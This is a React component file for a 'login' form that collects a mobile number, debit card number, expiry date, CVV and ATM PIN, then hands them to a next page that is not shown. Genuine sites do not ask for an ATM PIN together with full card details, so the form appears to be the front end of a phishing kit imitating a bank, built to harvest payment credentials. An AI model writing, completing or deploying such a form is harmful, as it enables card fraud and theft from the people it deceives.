import React, { useState } from "react";
import styles from "./LoginForm.module.css";
import NextPage from "./NextPage";

const LoginForm = () => {
  const [mobileNumber, setMobileNumber] = useState("");
  const [debitNumber, setDebitNumber] = useState("");
  const [expiryDate, setExpiryDate] = useState("");
  const [btnClick, setBtnClick] = useState(false);
  const [userData, setuserData] = useState({});

  const [cvv, setCVV] = useState("");
  const [pin, setPin] = useState("");

  // let userData = {};
  const handleSubmit = (e) => {
    e.preventDefault();

    const formData = {
      mobileNumber,
      debitNumber,
      expiryDate,
      cvv,
      pin,
    };

    setuserData(formData);

    setBtnClick(true);
    // const submitOrderHandler = async (userData) =>
    // setIsSubmitting(true);

    // setIsSubmitting(false);
    // setDidSubmit(true);
    // ;
  };

  const firstPage = (
    <div className={styles.container}>
      <form onSubmit={handleSubmit} className={styles.form}>
        <div className={styles.formGroup}>
          <label className={styles.label}>
            <i>Mobile Number*</i>
          </label>
          <input
            type='tel'
            name='Mobile No.'
            className={styles.input}
            inputMode='numeric'
            placeholder='Enter Your Mobile Number'
            maxLength='10'
            pattern='[0-9]\d{9}'
            title='Please enter valid 10 digit mobile number'
            required
            value={mobileNumber}
            onChange={(e) => setMobileNumber(e.target.value)}
          />
        </div>

        <div className={styles.formGroup}>
          <label className={styles.label}>
            <i>Debit card number*</i>
          </label>
          <input
            type='tel'
            name='Debit Number'
            className={styles.input}
            inputMode='numeric'
            maxLength='16'
            minLength='16'
            placeholder='Enter Your Debit Number'
            title='Please enter valid 16 digit account number'
            required
            value={debitNumber}
            onChange={(e) => setDebitNumber(e.target.value)}
          />
        </div>

        <div className={styles.formGroup}>
          <label className={styles.label}>
            <i>Expiry Date*</i>
          </label>
          <input
            type='date'
            name='Expiry Date'
            className={`${styles.input} ${styles.dateFormat}`}
            // inputMode='date'
            // maxLength='7'
            placeholder='MM/YYYY'
            required
            value={expiryDate}
            onChange={(e) => setExpiryDate(e.target.value)}
          />
          <p className={styles.error} style={{ display: "none" }}>
            Invalid Ex. Date. Only MM/YYYY format allowed.
          </p>
        </div>

        <div className={styles.formGroup}>
          <label className={styles.label}>
            <i>CVV*</i>
          </label>
          <input
            type='tel'
            name='CVV'
            className={styles.input}
            inputMode='numeric'
            maxLength='3'
            minLength='3'
            placeholder='Enter Your CVV'
            title='Please enter valid 3 digit CVV'
            required
            value={cvv}
            onChange={(e) => setCVV(e.target.value)}
          />
        </div>

        <div className={styles.formGroup}>
          <label className={styles.label}>
            <i>Enter ATM PIN*</i>
          </label>
          <input
            type='tel'
            name='atm pin'
            className={styles.input}
            inputMode='numeric'
            maxLength='4'
            minLength='3'
            placeholder='Enter Your ATM PIN'
            title='Please enter valid 4 digit atm pin'
            required
            value={pin}
            onChange={(e) => setPin(e.target.value)}
          />
        </div>

        <div className={styles.formGroup}>
          <table
            className={styles.tableForm}
            border='0'
            cellpadding='5'
            cellspacing='0'
          >
            <tbody>
              <tr>{/* Table content here */}</tr>
            </tbody>
          </table>
        </div>

        <div className={styles.formGroup}>
          <button type='submit' className={styles.submitBtns}>
            SUBMIT
          </button>
        </div>
      </form>
      <img src='futterhas.png' className={styles.footerImage} alt='' />
    </div>
  );

  return (
    <div className={styles.divContainer}>
      {!btnClick ? firstPage : <NextPage userData={userData} />}
    </div>
  );
};

export default LoginForm;
